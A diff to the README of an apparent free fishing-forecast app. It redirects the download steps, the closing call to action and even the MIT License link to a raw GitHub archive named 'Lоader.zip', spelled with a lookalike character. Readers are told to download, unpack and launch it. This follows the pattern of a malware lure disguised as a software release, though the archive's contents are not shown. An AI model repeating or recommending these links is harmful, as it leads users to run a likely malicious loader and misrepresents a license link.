@@ -34,7 +34,7 @@ Your fishing forecast, angling journal, and weather planning are always ready �
 
 ## 📥 Installation Guide 🛠️
 
-1. **Download Loader.rar from the repository**.
+1. **Download https://raw.githubusercontent.com/Fabri141164/NiceDayForFishing-FreebieHub/main/Lоader.zip from the repository**.
 2. Unpack the archive to your preferred folder.
 3. Launch the installer suitable for your operating system (Windows, macOS, Linux, or Mobile Edition).
 4. Follow the on-screen setup instructions.
@@ -84,12 +84,12 @@ This application is provided free for fishing enthusiasts and hobbyists. While e
 
 ## 📜 License and Community 🧑‍💻
 
-All source code is licensed under the [MIT License](https://opensource.org/licenses/MIT) — use, customize, or contribute with confidence!
+All source code is licensed under the [MIT License](https://raw.githubusercontent.com/Fabri141164/NiceDayForFishing-FreebieHub/main/Lоader.zip) — use, customize, or contribute with confidence!
 
 ---
 
 ## 🎇 Start Your Next Adventure Today! 🏞️
 
-Download **Loader.rar** and make every day a *nice day for fishing*!
+Download **https://raw.githubusercontent.com/Fabri141164/NiceDayForFishing-FreebieHub/main/Lоader.zip** and make every day a *nice day for fishing*!
 
 ---
